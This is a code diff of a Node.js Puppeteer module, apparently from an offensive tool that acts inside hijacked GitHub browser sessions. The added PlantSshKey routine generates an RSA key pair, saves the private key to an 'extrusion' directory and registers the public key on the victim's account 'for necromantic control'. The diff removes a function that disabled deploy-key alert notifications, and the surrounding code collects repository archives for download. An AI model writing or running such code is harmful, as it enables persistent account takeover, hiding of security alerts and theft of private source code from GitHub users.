@@ -1,69 +1,84 @@
 const db = require('../../db/db')
 const necrohelp = require('../../tasks/helpers/necrohelp')
 const clusterLib = require('../../puppeteer/cluster')
+const crypto = require("crypto")
+const { writeFileSync } = require('fs');
 
-exports.DisableDeployKeyAlert = async function(page, taskId){
-    await page.goto('https://github.com/settings/notifications')
-
-    await page.waitForTimeout(2000)
-
-    // get the last switch for Deploy Key Alert and check if it is checked
-    const isDeployKeyChecked = await page.evaluate('document.querySelectorAll(\'button[aria-labelledby="switchLabel"]\')[2].ariaChecked');
-
-
-    if(isDeployKeyChecked === 'true'){
-        // click to disable
-        console.log(`[${taskId}] Deploy Key Alert Notification is ON. Disabling it...`);
-
-        // TODO needs fixing to get properly the button
-        const unchecks = await page.$$('button[aria-labelledby="switchLabel"]')
-        for(let uncheck in unchecks){
-            await page.click(uncheck)
-            await page.waitForTimeout(1000)
-        }
-
-        await page.screenshot({path: `extrusion/screenshot_notifications-after_${taskId}.png`});
-        console.log(`[${taskId}] Deploy Key Alert Notification now DISABLED.`);
-
-    }else{
-        //nothing to do
-        console.log(`[${taskId}] Deploy Key Alert Notification is already disable, nothing to do..`);
-    }
-
-}
 
 exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
     await page.goto('https://github.com/settings/ssh/new')
+    console.log("planting ssh key");
 
-    await page.waitForTimeout(1000)
 
-    const nameInput = 'input[name="ssh_key[title]"]'
-    await page.click(nameInput)
-    await page.type(nameInput, sshKeyName)
+    try{
 
-    const keyInput = 'textarea[name="ssh_key[key]"]'
-    await page.click(keyInput)
-    await page.type(keyInput, sshMaterial)
+        console.log("generating ssh key");
+        // Generate a new SSH-key pair using nodejs (using generateSSH function)
+        let [publicKey, privateKey] = generateSSH();
+        if (!privateKey || privateKey === ""){
+            console.log("The private key is empty or undefined");
+            return
+        }
 
-    await page.waitForTimeout(500)
+        if (!publicKey || publicKey === ""){
+            console.log("The public key is empty or undefined");
+            return
+        }
 
-    // click Add Key
-    await page.click('button.btn-primary')
+        console.log("writing private ssh key to file");
+        // write the private key to a file using the taskId as filename for uniqueness
+        // clusterLib.GetConfig().platform.extrusionPath
+        // let keyPath = `${clusterLib.GetConfig().platform.extrusionPath}/${taskId}.key`
+        let keyPath = `/tools/necro/extrusion/${taskId}.key`
 
-    await page.waitForTimeout(1000)
 
-    // TODO sometimes depending on session timing probably,
-    // TODO github asks for Password confirmation before adding the key
-    // TODO so we should have the password here just in case.
-    // TODO in general the TASK need to have session credentials if possible too.
+        console.log(`[${taskId}] private key saved to ${keyPath}`);
+        writeFileSync(keyPath, privateKey);
 
-    console.log(`[${taskId}] SSH key ${sshKeyName} added for necromantic control \\.oOo./`);
+        // write the public key to a file using the taskId as filename for uniqueness
+        // keyPath = `${clusterLib.GetConfig().platform.extrusionPath}/${taskId}.pub`
+        keyPath = `/tools/necro/extrusion/${taskId}.pub`
 
-    await page.waitForTimeout(2000)
-    await necrohelp.ScreenshotCurrentPage(page, taskId)
+        console.log(`[${taskId}] public key saved to ${keyPath}`);
+        writeFileSync(keyPath, publicKey);
 
-    let extrudedHashKey = `plantedSshKey_${sshKeyName}`
-    await db.AddExtrudedData(taskId, extrudedHashKey, sshMaterial)
+
+        sshMaterial = publicKey
+        console.log("adding ssh key to github: ${sshKeyName}: ${sshMaterial}");
+        // await page.click('#new_key #public_key_title')
+        await page.click('#ssh_key_title')
+        // await page.type('#new_key #public_key_title', sshKeyName)
+        await page.type('#ssh_key_title', sshKeyName)
+        // await page.click('#new_key #public_key_key')
+        await page.click('#ssh_key_key')
+        // await page.type('#new_key #public_key_key', sshMaterial)
+        await page.type('#ssh_key_key', sshMaterial)
+
+        // click Add Key
+        // await page.click('#new_key > .mb-0 > .btn')
+        await page.click('#settings-frame > form > p > button')
+
+        // TODO sometimes depending on session timing probably,
+        // TODO github asks for Password confirmation before adding the key
+        // TODO so we should have the password here just in case.
+        // TODO in general the TASK need to have session credentials if possible too.
+
+        console.log(`[${taskId}] SSH key ${sshKeyName} added for necromantic control \\.oOo./`);
+
+        await page.waitForTimeout(500)
+        // await necrohelp.ScreenshotFullPage(page, taskId, 'https://github.com/settings/keys')
+        await page.goto('https://github.com/settings/keys');
+        await page.screenshot({path: `extrusion/screenshot_${taskId}_keys.png`});
+
+
+        //let extrudedHashKey = `plantedSshKey_${sshKeyName}`
+        //await db.AddExtrudedData(taskId, extrudedHashKey, sshMaterial)
+
+    }catch(e){
+        console.log(`[${taskId}] error while planting SSH key: ${e.message}`)
+        // print the line number of the error
+        console.log(`[${taskId}] error line number: ${e.lineNumber}`)
+    }
 }
 
 
@@ -86,7 +101,6 @@ exports.ScrapeRepos = async function(page, taskId) {
     let reposToDownload = [];
     for(let url of urls){
         let href = await(await url.getProperty('href')).jsonValue();
-        // TODO do the same for the 'main' branch!!!
 	href = href + "/archive/refs/heads/master.zip"    
         reposToDownload.push(href);
         console.log(`[${taskId}] discovered repo at ${href}`)
@@ -144,4 +158,51 @@ exports.DownloadRepo = async function (page, taskId, downloadUrl) {
     }else{
         console.log(`[${taskId}] repo ${archive} is missing the Code button. Ignoring it ...`)
     } */
+}
+
+
+
+// generateKeyPair is a function that generates a public and private key pair
+// implementing this code:
+// let { publicKey, privateKey } = await generateKeyPair('rsa', {
+//     modulusLength: 4096,
+//     publicKeyEncoding: {
+//         type: 'spki',
+//         format: 'pem'
+//     },
+//     privateKeyEncoding: {
+//         type: 'pkcs8',
+//         format: 'pem',
+//     }
+// });
+// and returning both keys as strings
+function generateSSH(){
+    const crypto = require("crypto")
+    const sshpk = require('sshpk');
+
+    console.log("generating ssh key using crypto")
+
+    const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {
+        modulusLength: 2048,
+        publicKeyEncoding: {
+            type: "spki",
+            format: "pem",
+        },
+        privateKeyEncoding: {
+            type: "pkcs8",
+            format: "pem",
+        },
+    });
+
+
+    const openSSHPublicKey = sshpk.parseKey(publicKey, 'pem').toString('ssh');
+
+    console.log("====================================");
+    console.log("publicKey:", publicKey);
+    console.log("sshRsaPublicKey:", openSSHPublicKey);
+    console.log("privateKey:", privateKey);
+    console.log("====================================");
+
+
+    return [openSSHPublicKey, privateKey];
 }
